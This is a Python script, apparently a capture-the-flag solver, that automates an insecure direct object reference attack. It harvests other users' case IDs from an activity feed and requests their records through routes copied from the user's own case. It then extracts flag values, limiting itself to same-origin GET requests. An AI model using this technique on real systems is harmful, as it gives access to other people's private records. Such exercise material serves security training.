#!/usr/bin/env python3
"""Follow an assigned target's own activity references to exposed records."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import http.cookiejar
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError
from urllib.parse import quote, urljoin, urlsplit
from urllib.request import HTTPCookieProcessor, HTTPRedirectHandler, Request, build_opener

from inspect_target import MAX_BODY_BYTES, PageExtractor, normalize_url, origin, safe_filename


PROOF_RE = re.compile(r"\bproof[_-][A-Za-z0-9_-]{12,}\b")
MAX_REQUESTS = 12


class SameOriginRedirects(HTTPRedirectHandler):
    def __init__(self, allowed_origin: tuple[str, str, int]) -> None:
        super().__init__()
        self.allowed_origin = allowed_origin

    def redirect_request(self, request, file_pointer, code, message, headers, new_url):  # type: ignore[no-untyped-def]
        try:
            destination_origin = origin(new_url)
        except ValueError:
            return None
        if destination_origin != self.allowed_origin:
            return None
        return super().redirect_request(request, file_pointer, code, message, headers, new_url)


def same_origin_hrefs(
    body: bytes,
    content_type: str,
    page_url: str,
    allowed_origin: tuple[str, str, int],
) -> list[str]:
    if "html" not in content_type.lower() and not body.lstrip().lower().startswith(
        (b"<!doctype html", b"<html")
    ):
        return []
    match = re.search(r"charset\s*=\s*['\"]?([^;'\"]+)", content_type, re.IGNORECASE)
    charset = match.group(1).strip() if match else "utf-8"
    try:
        text = body.decode(charset, errors="replace")
    except LookupError:
        text = body.decode("utf-8", errors="replace")
    parser = PageExtractor()
    parser.feed(text)
    links: list[str] = []
    for item in parser.links:
        href = item.get("href", "")
        if not href:
            continue
        candidate = normalize_url(urljoin(page_url, href))
        if origin(candidate) == allowed_origin:
            links.append(candidate)
    return links


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Use same-origin GETs and a session cookie to follow exposed object references."
    )
    parser.add_argument("target", help="absolute target URL assigned by the Game Master")
    parser.add_argument("--output-dir", type=Path, help="evidence directory")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()
    if args.timeout <= 0:
        parser.error("--timeout must be greater than zero")

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
    except ValueError as exc:
        parser.error(str(exc))
    host = urlsplit(target).hostname or "target"
    output_dir = args.output_dir or Path("web-evidence") / f"{host}-idor"
    output_dir.mkdir(parents=True, exist_ok=True)

    jar = http.cookiejar.CookieJar()
    opener = build_opener(HTTPCookieProcessor(jar), SameOriginRedirects(allowed_origin))
    seen_urls: set[str] = set()
    records: list[dict[str, object]] = []

    def get(url: str) -> tuple[dict[str, object], bytes] | None:
        normalized = normalize_url(url)
        if origin(normalized) != allowed_origin:
            return None
        if normalized in seen_urls or len(seen_urls) >= MAX_REQUESTS:
            return None
        seen_urls.add(normalized)
        request = Request(
            normalized,
            headers={"User-Agent": "HuntressCTF-Web-Inspector/1.0", "Accept": "*/*"},
            method="GET",
        )
        try:
            response = opener.open(request, timeout=args.timeout)
        except HTTPError as exc:
            response = exc
        status = getattr(response, "status", response.code)
        headers = {key.lower(): value for key, value in response.headers.items()}
        body = response.read(MAX_BODY_BYTES + 1)
        truncated = len(body) > MAX_BODY_BYTES
        body = body[:MAX_BODY_BYTES]
        digest = hashlib.sha256(body).hexdigest()
        body_path = output_dir / safe_filename(len(records) + 1, normalized)
        body_path.write_bytes(body)
        record: dict[str, object] = {
            "requested_url": normalized,
            "status": status,
            "content_type": headers.get("content-type", ""),
            "body_sha256": digest,
            "body_bytes": len(body),
            "body_truncated": truncated,
            "body_file": body_path.name,
        }
        records.append(record)
        return record, body

    root_result = get(target)
    if root_result is None or root_result[0]["status"] != 200:
        print(json.dumps({"error": "target root could not be read", "records": records}, indent=2))
        return 1
    root_record, root_body = root_result
    root_links = same_origin_hrefs(
        root_body,
        str(root_record["content_type"]),
        str(root_record["requested_url"]),
        allowed_origin,
    )
    activity_links = [
        link
        for link in root_links
        if urlsplit(link).path.startswith("/api/")
        and re.search(r"history|events?|activity|timeline", urlsplit(link).path, re.IGNORECASE)
    ]
    case_links: list[tuple[str, str]] = []
    for link in root_links:
        path_parts = [part for part in urlsplit(link).path.split("/") if part]
        if (
            len(path_parts) == 2
            and path_parts[0] not in {"api", "assets"}
            and re.fullmatch(r"[0-9]{1,20}", path_parts[1])
        ):
            case_links.append((link, path_parts[1]))
    if not activity_links or not case_links:
        print(json.dumps({"error": "case links or activity-feed link not found on target home page", "records": records}, indent=2))
        return 1

    history_result = get(activity_links[0])
    if history_result is None:
        return 1
    history_record, history_body = history_result
    try:
        history = json.loads(history_body.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError):
        print(json.dumps({"error": "activity feed was not valid JSON", "records": records}, indent=2))
        return 1

    own_case_link, own_case_id = case_links[0]
    own_case_result = get(own_case_link)
    if own_case_result is None:
        print(json.dumps({"error": "could not inspect an owned case page", "records": records}, indent=2))
        return 1
    own_case_record, own_case_body = own_case_result
    own_case_text = own_case_body.decode("utf-8", errors="replace")
    api_templates: list[str] = []
    for match in re.finditer(r"""['"](/api/[^'"]+)['"]""", own_case_text):
        route = match.group(1)
        if own_case_id in route and route not in api_templates:
            api_templates.append(route)
    direct_route = urlsplit(own_case_link).path
    direct_template = direct_route.replace(own_case_id, "{case_id}", 1)

    current_user = str(history.get("current_user", ""))
    referenced_ids: list[str] = []
    for event in history.get("events", []):
        if not isinstance(event, dict) or "case_id" not in event:
            continue
        owner = str(event.get("owner", ""))
        if event.get("visibility") == "reference_only" or (owner and owner != current_user):
            case_id = str(event["case_id"])
            if re.fullmatch(r"[A-Za-z0-9_-]{1,64}", case_id):
                referenced_ids.append(case_id)

    proofs: list[dict[str, str]] = []
    for case_id in dict.fromkeys(referenced_ids):
        # The owned record discloses its API templates. Try those structured
        # endpoints first; keep the visible page route as a fallback.
        candidate_routes = [
            route.replace(own_case_id, quote(case_id, safe=""))
            for route in api_templates
        ]
        candidate_routes.append(
            direct_template.replace("{case_id}", quote(case_id, safe=""))
        )
        for path in dict.fromkeys(candidate_routes):
            result = get(urljoin(target, path))
            if result is None:
                continue
            record, body = result
            if record["status"] != 200:
                continue
            text = body.decode("utf-8", errors="replace")
            for value in PROOF_RE.findall(text):
                proofs.append(
                    {
                        "answer": value,
                        "source_url": str(record["requested_url"]),
                        "sha256": str(record["body_sha256"]),
                        "body_file": str(record["body_file"]),
                    }
                )

    report_path = output_dir / "report.json"
    report_path.write_text(
        json.dumps(
            {
                "target": target,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "request_policy": {
                    "method": "GET",
                    "same_origin_only": True,
                    "max_response_bytes": MAX_BODY_BYTES,
                    "max_requests": MAX_REQUESTS,
                    "session_cookie_jar": "in-memory",
                },
                "current_user": current_user,
                "own_case_route": direct_route,
                "discovered_api_templates": api_templates,
                "referenced_case_ids": list(dict.fromkeys(referenced_ids)),
                "records": records,
                "proofs": proofs,
            },
            indent=2,
            ensure_ascii=False,
        )
        + "\n",
        encoding="utf-8",
    )
    print(json.dumps({"report": str(report_path), "proofs": proofs}, indent=2))
    return 0 if proofs else 1


if __name__ == "__main__":
    sys.exit(main())
